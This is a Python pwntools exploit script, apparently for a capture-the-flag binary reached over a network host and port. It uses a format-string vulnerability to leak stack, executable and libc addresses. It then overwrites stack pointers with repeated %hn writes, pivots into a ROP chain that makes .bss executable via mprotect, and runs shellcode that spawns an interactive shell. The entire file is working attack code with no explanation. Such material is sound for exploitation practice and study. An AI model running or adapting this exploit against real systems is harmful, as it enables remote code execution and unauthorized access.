#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.172 --port 60903 ./print_only
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
# host = args.HOST or '103.152.242.172'
# port = int(args.PORT or 60903)

host = args.HOST or '103.152.242.172'
port = int(args.PORT or 40904)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    # , aslr=False
    if args.GDB:
        return gdb.debug([exe.path] + argv, aslr=False, env={"LD_PRELOAD":"./libc6_2.27-3ubuntu1.4_amd64.so"},gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env={"LD_PRELOAD":"./libc6_2.27-3ubuntu1.4_amd64.so"}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
# b *0x5555555551ed
b *0x55555555522b
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def send(p):
    p = p.ljust(0x128,"\x00")
    io.send(p)

if args.LOCAL :
    libc = exe.libc
    libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
else:
    # libc = ELF("./libc.so.6")
    libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
    # libc = ELF("./libc6_2.31-6_amd64.so")
    # libc = ELF("./libc6_2.31-9_amd64.so")

def syscall(rax, rdi, rsi, rdx):
    chain = p64(pop_rax) + p64(rax)
    chain += p64(pop_rdi) + p64(rdi)
    chain += p64(pop_rsi) + p64(rsi)
    chain += p64(pop_rdx) + p64(rdx) + p64(0xdeadbeef)
    chain += p64(syscall_ret)
    return chain


# %8$p-%9$p-%11$p-%12$p-%13$p-%14$p-%15$p
# 9 = 13
# 0x7fff4cb2b780-0x56086879726d-0xa03e68ea03423c00-0x56086879a068-0x560868797240-0x2000000000-0x7fff4cb2b868
p='%p-%15$p-%13$p'
send(p)
leak = (io.recv(4200)).split('-')
print leak

base_exe = int(leak[0],16)- 0x4060
stack = int(leak[1],16)
if args.LOCAL :
    libc.address = int(leak[2],16) - libc.sym["__libc_start_main"] - 234 + 3
else:
    libc.address = int(leak[2],16) - libc.sym["__libc_start_main"] - 234 + 3

print hex(stack)
print hex(base_exe)
print hex(libc.address)

pop_rax = libc.search(asm('pop rax ; ret')).next()
pop_rbp = libc.search(asm('pop rbp ; ret')).next()
pop_rdi = libc.search(asm('pop rdi ; ret')).next()
pop_rsi = libc.search(asm('pop rsi ; ret')).next()
if args.LOCAL :
    # pop_rdx = libc.search(asm('pop rdx ; pop r12 ; ret')).next()
    pop_rdx = libc.search(asm('pop rdx ; pop r10 ; ret')).next()
else:
    pop_rdx = libc.search(asm('pop rdx ; pop r10 ; ret')).next()
syscall_ret = libc.search(asm('syscall ; ret')).next()

leave= base_exe + 0x1240

bss = base_exe + 0x4000
stack_rbp = stack + 16

print "leave :", hex(leave)
print "base_exe + 0x4060 + 8 :", hex(base_exe + 0x4060 + 8)

def format_string(dari, to, len_format = 0xff):
    sys = dari
    offset = []

    for i in range(1):
       tmp = sys & len_format
       offset.append(tmp)
       sys >>= len_format.bit_length() # bit

    p = '%{}x%{}$hnEOF'.format(offset[0], to)
    p = p.ljust(32, '\x00')
    send(p)
    io.recvuntil("EOF")

len_format = 0xffff
# sys = leave
sys = stack
offset = []

for i in range(3):
   tmp = sys & len_format
   offset.append(tmp)
   sys >>= len_format.bit_length() # bit

go = stack - 8
print "sys :", hex(sys)
print "go :", hex(go)

format_string(go, 15, len_format = 0xffff)
format_string(offset[0], 41, len_format = 0xffff)

format_string(go+2, 15, len_format = 0xffff)
format_string(offset[1], 41, len_format = 0xffff)

format_string(go+4, 15, len_format = 0xffff)
format_string(offset[2], 41, len_format = 0xffff)

len_format = 0xffff
# sys = leave
sys = libc.search(asm("pop rsp ; ret")).next()
print "sys :", hex(sys)
offset = []

for i in range(3):
   tmp = sys & len_format
   offset.append(tmp)
   sys >>= len_format.bit_length() # bit

go = stack - 0xf8
print "go :", hex(go)

format_string(go, 15, len_format = 0xffff)
format_string(offset[0], 41, len_format = 0xffff)

format_string(go+2, 15, len_format = 0xffff)
format_string(offset[1], 41, len_format = 0xffff)

format_string(go+4, 15, len_format = 0xffff)
format_string(offset[2], 41, len_format = 0xffff)

rop_addr = base_exe + 0x4000 + 0xf0
len_format = 0xffff
# sys = leave
sys = base_exe + 0x4000 + 0xf0
print "sys :", hex(sys)
offset = []

for i in range(4):
   tmp = sys & len_format
   offset.append(tmp)
   sys >>= len_format.bit_length() # bit

go = stack - 0xf0

print "go :", hex(go)

format_string(go, 15, len_format = 0xffff)
format_string(offset[0], 41, len_format = 0xffff)

format_string(go+2, 15, len_format = 0xffff)
format_string(offset[1], 41, len_format = 0xffff)

format_string(go+4, 15, len_format = 0xffff)

p = '%{}x%{}$nEOF'.format(offset[2], 41)
p = p.ljust(32, '\x00')
send(p)
io.recvuntil("EOF")

# format_string(go+4, 15, len_format = 0xffff)
# format_string(offset[2], 41, len_format = 0xffff)

rop = ROP(libc)
rop.call(libc.sym['mprotect'], [base_exe + 0x4000, 0x1000, 0x7])
rop = bytes(rop)

p  = b'\x00' * 0x88 + '/bin/sh\x00'
p += rop

# p += p64(pop_rax)
# p += p64(1)
# p += p64(pop_rdi)
# p += p64(base_exe + exe.got['printf'])
# p += p64(libc.sym['puts'])
# p += p64(base_exe + exe.plt['printf'])

p += p64(rop_addr + len(rop) + 8)
p += asm(shellcraft.sh())
# p += asm('''
#         movabs rsp, {}
#         movabs rdi, {}
#         xor rsi, rsi
#         xor rdx, rdx
#         mov rax, 0x3b
#         syscall
#     '''.format(stack, rop_addr - 8) )
print (len(p))
p = p.ljust(0x128,"\x00")
io.send(p)

where = ( stack - 0x100 ) & 0xffff
what = (base_exe + 0x12cc ) & 0xffff

print "where :", hex(where)
print "what :", hex(what)

p = '%{}x%{}$hn-EOF'.format(where, 36)
p = p.ljust(32, '\x00')
io.sendline(p)
io.recvuntil("EOF")

p = '%{}x%{}$hn-EOF'.format(what, 40)
p = p.ljust(32, '\x00')
io.sendline(p)
io.recvuntil("EOF")

# leak = u64((io.recvline()[:-1]).ljust(8,"\x00"))

# print hex(leak)
# format_string(where, 36, len_format = 0xffff)
# format_string(what, 40, len_format = 0xffff)


io.interactive()
